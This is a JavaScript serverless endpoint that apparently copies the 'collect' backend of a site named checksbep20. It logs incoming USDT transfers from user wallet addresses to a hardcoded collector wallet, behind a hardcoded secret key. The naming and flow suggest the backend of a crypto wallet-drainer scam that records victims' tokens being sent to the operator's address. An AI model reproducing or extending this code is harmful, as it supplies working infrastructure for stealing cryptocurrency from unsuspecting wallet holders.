// ============================================
// COLLECT ENDPOINT - POST /collect
// Exactly like: https://collector.checksbep20.org/collect
// ============================================

const SECRET_KEY = "7x143414";
const COLLECTOR_ADDRESS = "0x5681d680B047bF5b12939625C56301556991005e";

let transactions = [];

function generateTxId() {
    return 'tx_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

export default async function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only POST allowed
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const body = req.body;
        
        // Check secret
        const secret = body.token || body.secret || req.headers['x-topup-secret'];
        
        if (secret !== SECRET_KEY) {
            return res.status(401).json({
                status: 'error',
                error: 'Invalid secret key'
            });
        }
        
        // Extract data
        const userAddress = body.from || body.userAddress || body.signerAddress;
        const amount = body.amount || body.amountHuman;
        const recipient = body.to || COLLECTOR_ADDRESS;
        
        if (!userAddress || !amount) {
            return res.status(400).json({
                status: 'error',
                error: 'Missing required fields: from and amount'
            });
        }
        
        // Create transaction
        const transaction = {
            id: generateTxId(),
            timestamp: new Date().toISOString(),
            from: userAddress,
            amount: String(amount),
            to: recipient,
            status: 'approved'
        };
        
        transactions.unshift(transaction);
        
        if (transactions.length > 100) {
            transactions = transactions.slice(0, 100);
        }
        
        console.log(`✅ ${amount} USDT from ${userAddress}`);
        
        return res.status(200).json({
            status: 'success',
            message: 'Transaction logged successfully',
            id: transaction.id
        });
        
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            status: 'error',
            error: error.message
        });
    }
}
